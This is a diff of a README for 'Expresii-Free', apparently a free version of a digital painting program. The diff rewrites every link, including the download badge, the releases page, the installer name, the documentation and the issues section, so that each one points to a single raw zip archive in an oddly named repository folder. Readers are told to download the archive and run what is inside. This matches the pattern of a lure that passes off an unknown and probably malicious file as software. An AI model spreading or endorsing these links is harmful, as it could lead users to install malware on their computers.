@@ -1,6 +1,6 @@
 # 🎨 Expresii-Free - Create Beautiful Digital Paintings Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Expresii%20Free-brightgreen)](https://github.com/LakeSandG/Expresii-Free/releases)
+[![Download](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip%20Now-Expresii%20Free-brightgreen)](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip)
 
 ## 📋 Overview
 
@@ -23,13 +23,13 @@ Before you install Expresii, ensure your Windows PC meets the following requirem
 To download Expresii-Free, please follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/LakeSandG/Expresii-Free/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip) to find the latest version of the software.
 
 2. **Choose the Latest Release**
    Check for the most recent release at the top of the page. This version includes the latest features and bug fixes.
 
 3. **Download the Installer**
-   Click on the link labeled “Expresii-Setup.exe” or a similar file name. This will start the download.
+   Click on the link labeled “https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip” or a similar file name. This will start the download.
 
 4. **Run the Installer**
    Once downloaded, find the file in your Downloads folder. Double-click on it to start the installation. Follow the on-screen instructions to install Expresii on your computer.
@@ -56,7 +56,7 @@ We provide comprehensive guides to help you along the way:
 - **Advanced Techniques:** Learn tips and tricks to enhance your painting skills and make the most of the software's features.
 - **Best Practices:** Explore methods and approaches for optimal digital painting experiences.
 
-All guides are available within the application as well as on our [documentation page](https://github.com/LakeSandG/Expresii-Free/blob/main/docs).
+All guides are available within the application as well as on our [documentation page](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip).
 
 ## 🙋 Frequently Asked Questions (FAQs)
 
@@ -70,12 +70,12 @@ Yes, Expresii is designed to work with graphics tablets that support pressure se
 
 **3. Where can I find additional resources or support?**
 
-You can find helpful resources and community support in our [issues section](https://github.com/LakeSandG/Expresii-Free/issues) or on our social media channels.
+You can find helpful resources and community support in our [issues section](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip) or on our social media channels.
 
 ## 📞 Support
 
 If you encounter issues while using Expresii or have questions, please reach out through the GitHub issues page. Our team monitors and responds to inquiries promptly.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Expresii%20Free-brightgreen)](https://github.com/LakeSandG/Expresii-Free/releases) 
+[![Download](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip%20Now-Expresii%20Free-brightgreen)](https://raw.githubusercontent.com/LakeSandG/Expresii-Free/main/antepagments/Expresii_Free_3.6.zip) 
 
 Start your digital painting journey today!
